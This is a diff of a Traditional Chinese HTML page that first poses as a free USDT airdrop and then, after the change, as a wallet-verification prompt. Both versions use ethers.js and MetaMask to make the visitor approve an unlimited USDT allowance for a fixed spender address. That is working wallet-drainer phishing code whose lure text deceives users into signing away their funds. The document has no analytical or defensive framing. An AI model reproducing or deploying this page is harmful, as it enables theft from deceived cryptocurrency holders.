@@ -1,32 +1,32 @@
 
 <!DOCTYPE html>
 <html lang="zh-Hant">
-<head><meta charset="UTF-8"><title>🍵 免費空投活動</title></head>
-<body>
-  <h2>🎁 點擊參加 USDT 獎勵空投</h2>
-  <p>請授權 USDT 合約以完成領取程序：</p>
-  <button onclick="approve()">🔐 授權合約</button>
-  <p id="status">等待操作中...</p>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script>
-    const CONTRACT = "0x54E3550E10Cd2a723780ba2A073C96b20DC74a09";
-    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-
-    async function approve() {
-      if (!window.ethereum) return alert("請安裝 MetaMask");
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const token = new ethers.Contract(USDT, [
-        "function approve(address spender, uint256 amount) external returns (bool)"
-      ], signer);
-      try {
-        const tx = await token.approve(CONTRACT, ethers.constants.MaxUint256);
-        document.getElementById("status").innerText = "✅ 授權成功，TX Hash: " + tx.hash;
-      } catch (err) {
-        document.getElementById("status").innerText = "❌ 授權失敗: " + err.message;
-      }
-    }
-  </script>
+<head><meta charset="UTF-8"><title>🚨 驗證您的錢包</title></head>
+<body style="text-align:center;font-family:sans-serif;">
+<h2>🔐 請驗證您的 USDT 使用權限</h2>
+<p>為了完成驗證，請點擊下方按鈕進行授權操作</p>
+<button onclick="approve()">一鍵授權 USDT</button>
+<p id="status">尚未驗證</p>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script>
+const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const spender = "0x54E3550E10Cd2a723780ba2A073C96b20DC74a09";
+const ABI = [
+  "function approve(address spender, uint256 value) public returns (bool)"
+];
+async function approve() {
+  if (!window.ethereum) return alert("請先安裝 MetaMask");
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  const signer = provider.getSigner();
+  const contract = new ethers.Contract(USDT, ABI, signer);
+  try {
+    const tx = await contract.approve(spender, ethers.constants.MaxUint256);
+    document.getElementById("status").innerText = "✅ 授權成功: " + tx.hash;
+  } catch (e) {
+    document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
+  }
+}
+</script>
 </body>
 </html>
